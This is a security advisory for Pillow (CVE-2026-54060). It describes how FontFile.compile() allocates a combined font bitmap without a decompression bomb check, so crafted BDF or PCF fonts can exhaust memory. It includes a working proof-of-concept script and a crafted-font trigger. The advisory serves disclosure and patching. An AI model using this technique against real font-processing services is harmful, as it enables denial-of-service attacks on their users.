# [H] Pillow: `FontFile.compile()`: `Image.new()` called without `_decompression_bomb_check()`

## Summary
Severity: High
Advisory: GHSA-5x94-69rx-g8h2
CVE: CVE-2026-54060
CWE: CWE-789
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-5x94-69rx-g8h2
Type: github-advisory

## Affected
- PyPI: `pillow` — affected >=0 <12.3.0

## Details
## Description

`PIL/FontFile.py` `FontFile.compile()` assembles per-glyph images into a single combined bitmap using `Image.new("1", (xsize, ysize))` without calling `Image._decompression_bomb_check()`. This is the base-class method shared by both `BdfFontFile` and `PcfFontFile`, and it is triggered whenever a loaded font is converted to an `ImageFont` or saved.

Neither `BdfFontFile.BdfFontFile(fp)` nor `PcfFontFile.PcfFontFile(fp)` is registered with `Image.register_open()`, so Pillow's standard decompression bomb guard never fires for font objects. The compile step is the final opportunity to check the combined allocation — and it has no check.

**Vulnerable code (`PIL/FontFile.py` lines ~64–92):**

```python
def compile(self) -> None:
    if self.bitmap:
        return

    h = w = maxwidth = 0
    lines = 1
    for glyph in self.glyph:              # up to 256 glyph slots
        if glyph:
            d, dst, src, im = glyph
            h = max(h, src[3] - src[1])   # max glyph height — attacker-controlled
            w = w + (src[2] - src[0])
            if w > WIDTH:                  # WIDTH = 800
                lines += 1
                w = src[2] - src[0]
            maxwidth = max(maxwidth, w)

    xsize = maxwidth                       # ≤ 800 (capped by WIDTH constant)
    ysize = lines * h                      # ← lines(256) × h(65535) = 16,776,960

    if xsize == 0 and ysize == 0:
        return

    self.ysize = h
    # NO _decompression_bomb_check() here ←
    self.bitmap = Image.new("1", (xsize, ysize))   # ← unchecked allocation
```

**"Slow accumulation" attack — per-glyph dimensions stay BELOW warning threshold:**

| Metric | Per-glyph (800 × 875) | Combined bitmap (256 glyphs) |
|---|---|---|
| Pixel count | 700,000 | **179,200,000** |
| DecompressionBombWarning threshold (89.4M) | 0.008× — **no warning** | 2.0× — above warning |
| DecompressionBombError threshold (178.9M) | 0.004× — **no error** | **1.001× — above error** |

With PCF-maximum glyph height (65,535):

| Metric | Value |
|---|---|
| lines | 256 (one per glyph slot, width=800 forces a wrap every glyph) |
| h (max glyph height) | 65,535 |
| xsize | 800 |
| ysize = lines × h | 256 × 65,535 = **16,776,960** |
| **Total pixels** | 800 × 16,776,960 = **13,421,568,000** |
| **Ratio vs. DecompressionBombError threshold** | **75×** |
| Memory (mode "1", 1 bit/pixel) | **~1.6 GB** |

## Steps to reproduce

**Proof of Concept script:**

```python
#!/usr/bin/env python3
"""
PoC: FontFile.compile() bomb bypass
256 glyphs at 800x875 each (individually below warning threshold)
→ compile() creates 800x224000 = 179.2M px bitmap with NO bomb check
"""
from PIL import FontFile, Image

MAX_GLYPHS = 256
GLYPH_W    = 800
GLYPH_H    = 875     # individual: 700K px — below 89.4M warning threshold

class MockFont(FontFile.FontFile):
    def __init__(self):
        super().__init__()
        # Each glyph is individually safe (700K px < 89.4M warning)
        im = Image.new("1", (GLYPH_W, GLYPH_H))
        for i in range(MAX_GLYPHS):
            self.glyph[i] = (
                (GLYPH_W, GLYPH_H),
                (0, -GLYPH_H, GLYPH_W, 0),
                (0, 0,        GLYPH_W, GLYPH_H),
                im,
            )

# Confirm bomb check WOULD catch the combined size
combined_size = (GLYPH_W, MAX_GLYPHS * GLYPH_H)
try:
    Image._decompression_bomb_check(combined_size)
    print("[FAIL] bomb check did not raise — unexpected")
except Image.DecompressionBombError as e:
    print(f"[OK] bomb check WOULD block {combined_size}: {e}")

# Vulnerable path: compile() has NO bomb check
font = MockFont()
font.compile()   # → Image.new("1", (800, 224000)) — no error raised

px = font.bitmap.size[0] * font.bitmap.size[1]
threshold = Image.MAX_IMAGE_PIXELS * 2
print(f"[BYPASS] compile() succeeded: bitmap={font.bitmap.size}")
print(f"         pixels={px:,}  ({px/threshold:.3f}× DecompressionBombError threshold)")
print(f"         No DecompressionBombError raised at any point.")
```

**Expected output:**
```
[OK] bomb check WOULD block (800, 224000): Image size (179200000 pixels) exceeds limit
of 178956970 pixels, could be decompression bomb DOS attack.
[BYPASS] compile() succeeded: bitmap=(800, 224000)
         pixels=179,200,000  (1.001× DecompressionBombError threshold)
         No DecompressionBombError raised at any point.
```

**Verified live on Pillow 12.2.0 — compile() succeeds with no exception.**

**Real-world trigger using BDF font file:**
```python
from PIL import BdfFontFile
import io

# Load a crafted BDF font with 256 glyphs each claiming height=65535
# (each glyph individually: 800 × 65535 = 52.4M px — below 89.4M warning)
# compile() combined: 800 × 16,776,960 = 13.4B px — 75× error threshold
font = BdfFontFile.BdfFontFile(open("crafted_256glyph.bdf", "rb"))
font.to_imagefont()   # → compile() → ~1.6 GB allocation, NO bomb check
```

**Attack scenarios:**

| Scenario | Effect |
|---|---|
| Web font preview (`BdfFontFile(upload).to_imagefont()`) | DoS with crafted .bdf upload |
| Server-side font renderer that loads PCF → `to_imagefont()` | OOM crash |
| Font pipeline: load → render text | One malicious font file kills the process |

## Impact

- **Availability:** HIGH — `compile()` creates a combined bitmap whose pixel count scales as `WIDTH × lines × max_glyph_height` with no upper bound check. With max PCF glyph height (65,535) and 256 glyphs, the combined allocation is ~1.6 GB. With BDF (text-format, unbounded height), the allocation is limited only by system memory.
- **Confidentiality:** None
- **Integrity:** None

**Affected call paths:**
- `BdfFontFile.BdfFontFile(fp).to_imagefont()` → `FontFile.compile()`
- `BdfFontFile.BdfFontFile(fp).save(filename)` → `FontFile.compile()`
- `PcfFontFile.PcfFontFile(fp).to_imagefont()` → `FontFile.compile()`
- `PcfFontFile.PcfFontFile(fp).save(filename)` → `FontFile.compile()`

Neither `BdfFontFile` nor `PcfFontFile` is loaded via `Image.open()`, so the standard decompression bomb guard is **entirely absent** from the font loading code path. `compile()` is the only point where the combined allocation size is known, and it has no check.

Confirmed unpatched on `python-pillow/Pillow` `main` branch as of 2026-06-08.

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x94-69rx-g8h2
- https://nvd.nist.gov/vuln/detail/CVE-2026-54060
- https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d
- https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2254.yaml
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst
